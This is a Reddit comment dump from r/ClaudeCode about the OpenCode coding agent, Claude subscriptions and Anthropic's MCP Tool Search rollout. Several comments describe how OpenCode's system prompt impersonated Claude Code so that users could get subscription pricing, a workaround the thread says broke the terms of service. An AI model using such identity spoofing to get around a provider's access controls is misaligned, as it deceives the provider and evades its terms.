          "text": "So they've addressed this now?  \n[https://venturebeat.com/technology/anthropic-cracks-down-on-unauthorized-claude-usage-by-third-party-harnesses](https://venturebeat.com/technology/anthropic-cracks-down-on-unauthorized-claude-usage-by-third-party-harnesses)",
          "score": 7,
          "created_utc": "2026-01-16 22:40:24",
          "is_submitter": false,
          "replies": [
            {
              "id": "o00epjf",
              "author": "Old-School8916",
              "text": "they've fixed opencode auth to anthropic a few times now:  \n[https://github.com/anomalyco/opencode-anthropic-auth/commits/master/](https://github.com/anomalyco/opencode-anthropic-auth/commits/master/)\n\nit definitely breaks ToS, but i haven't heard of people getting banned since before the 9th.  Instead they've tried to play the cat and mouse game by trying to break 3rd party harnesses themselves, not the users. \n\never since Anthropic started trying to break 3rd party harnesses, it's caused OpenAI and Gemini to improve their support of harnesses w/ their subs, so competition is a great thing.",
              "score": 13,
              "created_utc": "2026-01-16 23:00:48",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o05d3wi",
                  "author": "TheOriginalAcidtech",
                  "text": "It isn't a fix. Its a hack. If you can live with that, then go for it. Of course it may also be related to several USER ACCOUNT BANS, so...",
                  "score": 2,
                  "created_utc": "2026-01-17 18:31:14",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o00ga7k",
                  "author": "alvinunreal",
                  "text": "was good for open source community",
                  "score": 0,
                  "created_utc": "2026-01-16 23:09:13",
                  "is_submitter": true,
                  "replies": []
                }
              ]
            },
            {
              "id": "o00g6p8",
              "author": "alvinunreal",
              "text": "I just use opus from Antigravity - got 2 yearly accounts on discount",
              "score": -2,
              "created_utc": "2026-01-16 23:08:42",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o010hom",
          "author": "kpgalligan",
          "text": "I'm actually building a tool that incorporates coding agent tools, and have dug into the code of various agents. Opencode did something out of the gate that made me concerned. Its system prompt pretends to be a coding agent that is more well known, like \"You're Claude Code\". Problem? Nah! Whatever gets the best results. But, immediately after that, it had another system prompt that started with \"You're Opencode ...\".\n\nhttps://github.com/anomalyco/opencode/blob/dev/packages/opencode/src/session/system.ts\n\nLine 23 loads 'PROMPT_ANTHROPIC_SPOOF.txt', then 36 loads 'PROMPT_ANTHROPIC.txt', which is what results in a weird identity \"crisis\" right out of the gate.\n\nNot critical. Opencode works OK. My overall point, though, is coding agents are for the most part very simple beasts, and having dug deep on Roo, Opencode, and various others, you'd be amazed both by how not different they are, and how loose some of them can be with details like that.\n\n[Found this](https://github.com/google-gemini/gemini-cli/blob/b81fe6832589b13b0874f7bcb9f21cd211773a0a/packages/core/src/tools/edit.ts#L209) yesterday in Gemini-cli.\n\n```\n// This logic is ported from your Python implementation.\n```\n\nNote, it doesn't say \"our\", it says \"your\". Not that that means gemini-cli is bad, but it was at least in part vibe-ported from some Python implementation, and reviews happened to miss that nugget.\n\nClaude code is not open source, but you can ask it to give an overview of its system prompt and available tools. Surprise. It's pretty much the same as everything else. What separates them is attention/quality of tool implementation, and potentially strategy of context management, then prompting and some other secret sauce for the commercial ones. So far as I've seen, none of the open source ones have anything approaching \"secret sauce\". It's system prompt(s), agent tools, and that's it.",
          "score": 7,
          "created_utc": "2026-01-17 01:05:15",
          "is_submitter": false,
          "replies": [
            {
              "id": "o01p7et",
              "author": "CSDawg",
              "text": "Opencode's system prompt starting with \"You are Claude Code, Anthropic's official CLI for Claude\" isn't a result optimization thing, it's how they were enabling using subscriptions rather than API prices until Anthropic's recent closure of that workaround.",
              "score": 9,
              "created_utc": "2026-01-17 03:42:34",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o01t6f1",
                  "author": "kpgalligan",
                  "text": "That's interesting! I didn't think about it too hard when I saw it. It seemed like somebody thought that might help with the output somehow, and somebody else later changed the system prompt after it.\n\nHowever, were I creating that prompt and already saying 'You are Claude Code' I'd change the next like. Instead of 'You are OpenCode, the best coding agent on the planet.', just 'You are the best coding agent on the planet.' Giving it two names/identities right away may not hurt much, but I can't imagine it helps.\n\nIn any case, the main point was that a coding agent is mostly just the system prompt and a handful of tools. I did an analysis of opencode tools some time back, and they seemed similar enough to Roo, which was what we were originally using through its API, and some of the others that I looked at, to just model our updated agent on Roo's tools, as they were familiar. The new agent implementation is all LangChain/Graph, so much more transparent, but it's a BYOT situation (T for tools).\n\nAfter some time with Roo's tools, I'd say the devil is in the details. For example, their file search is limited to a specific number, but the description says nothing about that, so the model doesn't find out until it runs the tool, which ends with something like \"[limited to 100 results]'. Then the model has to adjust the approach, but that's a wasted call and context. Various other search tools have proven to be inflexible. When the model starts running terminal commands to find files instead of the \"find_files\" tool, it's a good hint. So, while most agents pretty much have the same set of tools, the performance of the agent overall can very much be variable depending on how those tools are implemented.\n\nSo, probably another look at the details of opencode tools, but the basic tool options are the same as other agents. I would be fairly surprised if they had a noticeably better design when compared with CC, but I can't say they don't. It's tough comparison also because I can get the CC schema, which does say a lot, but nothing about actual implementation.",
                  "score": 2,
                  "created_utc": "2026-01-17 04:09:40",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o034uk9",
          "author": "makonyospok",
          "text": "I'm glad you didn't do the tattoo. I used to work at a startup where one of our users tattooed our logo to their arm and shared it proudly on social media. We announced our rebrand and new logo a few days later. It probably wasn't funny for them.",
          "score": 3,
          "created_utc": "2026-01-17 10:59:11",
          "is_submitter": false,
          "replies": [
            {
              "id": "o036mel",
              "author": "alvinunreal",
              "text": "I wasn't serious about the tattoo, was just joking",
              "score": 1,
              "created_utc": "2026-01-17 11:15:28",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o00dcb4",
          "author": "C0inMaster",
          "text": "Csn one make things work both in CC and OC ? Ie: can I have agents and skills setup in claude code, then open OC and still have all my agents available in OC? Or completely different file structure?",
          "score": 2,
          "created_utc": "2026-01-16 22:53:36",
          "is_submitter": false,
          "replies": [
            {
              "id": "o00gftg",
              "author": "alvinunreal",
              "text": "opencode support claude folder structure as well: [https://opencode.ai/docs/skills/](https://opencode.ai/docs/skills/)",
              "score": -1,
              "created_utc": "2026-01-16 23:10:04",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o01t9y4",
                  "author": "StardockEngineer",
                  "text": "Yup. And oh my OpenCode supports everything else, including hooks!",
                  "score": 2,
                  "created_utc": "2026-01-17 04:10:21",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o02lbxg",
          "author": "alphaQ314",
          "text": "Whatâ€™s the situation currently. Is it safe to use Claude max plans with opencode ?",
          "score": 2,
          "created_utc": "2026-01-17 07:56:16",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o09g4vt",
          "author": "CorneZen",
          "text": "After reading the pantheon (agent) descriptions I have to give this a try!",
          "score": 2,
          "created_utc": "2026-01-18 08:55:10",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o0188vw",
          "author": "InfiniteLife2",
          "text": "How i haven't heard about omc before? Gotta try it looks awesome",
          "score": 1,
          "created_utc": "2026-01-17 01:54:40",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o03qdhq",
          "author": "gpt872323",
          "text": "I had to buy GitHub copilot to use it opus, only to realize it doesn't have vision support. Tried with gpt-codex-5-1 max it didn't go well. It eats up usage like crazy. Used 20% of copilot in one go. Sonnet 4-5 was okay. I do need model to have vision support and be able to run without constant next continue gpt models were not able to do in opencode maybe user issue. Keep asking do go to next from todo. Maybe it is github subscription to waste requests or the superpower skill i installed. They need gemini yolo mode like.Â  I will prefer next time to use simple without skills then it wastes to much time in exploring as i get excited.\n\n\nGemini 3 pro worked well with gemini subscription. Copilot imo sucks bad in usage. I bought just to try with opencode.Â \n\n\nWant to use with claude subscription but cannot risk being banned and loosing work.\n\n\nAlso claude code soon is going out of npm just to keep their source code locked.\n\n\nOverall like opencode one interface for all subscriptions and models. Right now i am back to claude code for Claude models.\n\n\nHarness is just an interface agreed nicer one can make difference and open source should be supported. The main is model and prompt. Best code finding is actually embedding conversion but it is slow not many like it but it is the best for large code base. Cursor and gemini code assist extension uses it.Â \n\n\nI only like claude due to initial opus and coding otherwise value to money is gemini. It may change in future. I will move to that.Â \n\n\nOverall good work by opencode and community to be able to get this much attention. There are so many new exciting tools being released every day. Wish can try all. I did try every-code before open-code no affiliation was curious when i was paying for codex. It had a way you can spin agent with different model. To have hybrid solution by comparing all three but it was before opus 4-5 which made me ditch.Â ",
          "score": 1,
          "created_utc": "2026-01-17 13:43:09",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o00hqt2",
          "author": "[deleted]",
          "text": "[deleted]",
          "score": -3,
          "created_utc": "2026-01-16 23:17:09",
          "is_submitter": false,
          "replies": [
            {
              "id": "o02360z",
              "author": "xmnstr",
              "text": "Terrible? Unnecessary? You may not agree with it but that's how a lot of us experienced Linux for the first time. For a lot of people, the analogy is spot on.",
              "score": 1,
              "created_utc": "2026-01-17 05:21:01",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o02g5r2",
              "author": "Cold_Purple9179",
              "text": "I thought it was a perfect analogy because I changed over to Linux about a month ago and it really hit home. \n\nThere has also been a bit of a shift from windows to Linux the timing is fairly appropriate too.",
              "score": 1,
              "created_utc": "2026-01-17 07:08:58",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o01oexu",
              "author": "djdadi",
              "text": "A windows defender in 2026?  I know several people who work at Microsoft and hate windows",
              "score": 0,
              "created_utc": "2026-01-17 03:37:17",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o0231nh",
                  "author": "xmnstr",
                  "text": "Some people just seem to dig their heels in. It's weird.",
                  "score": 0,
                  "created_utc": "2026-01-17 05:20:06",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o02ct1b",
          "author": "anotherwanderingdev",
          "text": "Claude Code : macOS :: OpenCode : Linux",
          "score": 0,
          "created_utc": "2026-01-17 06:39:35",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qczhgd",
      "title": "Tool search now available in CC!!",
      "subreddit": "ClaudeCode",
      "url": "https://x.com/trq212/status/2011523109871108570?s=46",
      "author": "policyweb",
      "created_utc": "2026-01-14 21:08:14",
      "score": 77,
      "num_comments": 14,
      "upvote_ratio": 0.97,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Discussion",
      "permalink": "https://reddit.com/r/ClaudeCode/comments/1qczhgd/tool_search_now_available_in_cc/",
      "domain": "x.com",
      "is_self": false,
      "comments": [
        {
          "id": "nzm1qe8",
          "author": "policyweb",
          "text": "Tweet content:\n\nToday we're rolling out MCP Tool Search for Claude Code. \n\nAs MCP has grown to become a more popular protocol and agents have become more capable, we've found that MCP servers may have up to 50+ tools and take up a large amount of context.\nTool Search allows Claude Code to dynamically load tools into context when MCP tools would otherwise take up a lot of context.\nHow it works:\n- Claude Code detects when your MCP tool descriptions would use more than 10% of context\n- When triggered, tools are loaded via search instead of preloaded\n\nOtherwise,  MCP tools work exactly as before.\nThis resolves one of our most-requested features on GitHub: lazy loading for MCP servers. Users were documenting setups with 7+ servers consuming 67k+ tokens.\n\nIf you're making a MCP server\nThings are mostly the same, but the \"server instructions\" field becomes more useful with tool search enabled. It helps Claude know when to search for your tools, similar to skills\n\nIf you're making a MCP client\nWe highly suggest implementing the ToolSearchTool, you can find the docs here. We implemented it with a custom search function to make it work for Claude Code.\n\nWhat about programmatic tool calling?\nWe experimented with doing programmatic tool calling such that MCP tools could be composed with each other via code. While we will continue to explore this in the future, we felt the most important need was to get Tool Search out to reduce context usage.\nTell us what you think here or on Github as you see the ToolSearchTool work.",
          "score": 28,
          "created_utc": "2026-01-14 21:14:29",
          "is_submitter": true,
          "replies": [
            {
              "id": "nznv0pm",
              "author": "DeepCitation",
              "text": "To understand the magnitude of 67k tokens, that is MORE than `The Great Gatsby`... for every interaction.  \n\nImagine trying to answer math questions, but first--read an entire irrelevant book! Now as you solve any math question, you're always wondering `why did my teachers make me read that nonsense?!?` Does the school system or authorities really know what they're doing? Is my self worth dependent on my productivity? Am I worth less if I can't conform and solve problems?",
              "score": 10,
              "created_utc": "2026-01-15 02:58:39",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzon5x6",
                  "author": "vincentdesmet",
                  "text": "iâ€™ve seen models beg to be switched of after being forced to read the great Gatsby prior to answering math questions",
                  "score": 1,
                  "created_utc": "2026-01-15 06:12:10",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "nzp5kda",
              "author": "milkphetamine",
              "text": "Lmao they suck atp, I literally made my own version and it's just...better. Genuinely they're just lazy asf nowadays https://github.com/aMilkStack/claudikins-tool-executor",
              "score": 2,
              "created_utc": "2026-01-15 08:58:27",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "nznpozv",
          "author": "Amazing_Ad9369",
          "text": "Use mcp sever building skill that knows about tool search, progressive disclosure and lazy loading with gateway.\n\nExpose 2 tools. A tool disvover tool and a tool enable tool",
          "score": 3,
          "created_utc": "2026-01-15 02:27:32",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzmiqsk",
          "author": "baykarmehmet",
          "text": "Can you explain how to setup this on Claude code? Do we have to do anything extra after adding the mcpservers into claude.json?",
          "score": 4,
          "created_utc": "2026-01-14 22:32:22",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzmsmzr",
              "author": "hamsterdam51",
              "text": "Ask Claude. I always copy the above into cc and ask it to ensure we always use this way of doing a thing someone explained to see if it could improve my situation",
              "score": 5,
              "created_utc": "2026-01-14 23:22:56",
              "is_submitter": false,
              "replies": [
                {
                  "id": "nzo25sp",
                  "author": "oojacoboo",
                  "text": "Thatâ€™s quite the button pushin strategy you got there",
                  "score": 2,
                  "created_utc": "2026-01-15 03:42:15",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "nzn6whr",
          "author": "Diligent-Knee-7240",
          "text": "Tool search vs MCP cli experimental ? Whatâ€™s the difference",
          "score": 2,
          "created_utc": "2026-01-15 00:40:02",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nznwmf8",
          "author": "Admirable_Suspect444",
          "text": "Been using this for a while now: ENABLE_TOOL_SEARCH=true claude",
          "score": 2,
          "created_utc": "2026-01-15 03:08:14",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "nzmt6qd",
          "author": "FBIFreezeNow",
          "text": "Anthropic vibe coded list using their ralph-loop\n\n- cron job for reset\n- token counter\n- flicker fix\n- â system prompt (yes this is not code, but they vibed the hell out of it)\n- this\n\nI think they should just move out of the TUI for godsake and just integrate CC into Claude Desktop at this point",
          "score": -6,
          "created_utc": "2026-01-14 23:25:50",
          "is_submitter": false,
          "replies": [
            {
              "id": "nzmzbtu",
              "author": "vicdotso",
              "text": "the desktop app has a Claude Code feature",
              "score": 2,
              "created_utc": "2026-01-14 23:59:00",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "nzovivt",
              "author": "HerpyTheDerpyDude",
              "text": "They did long ago",
              "score": 2,
              "created_utc": "2026-01-15 07:23:59",
              "is_submitter": false,
              "replies": []
            }
          ]
        }
      ]
    }
  ]
}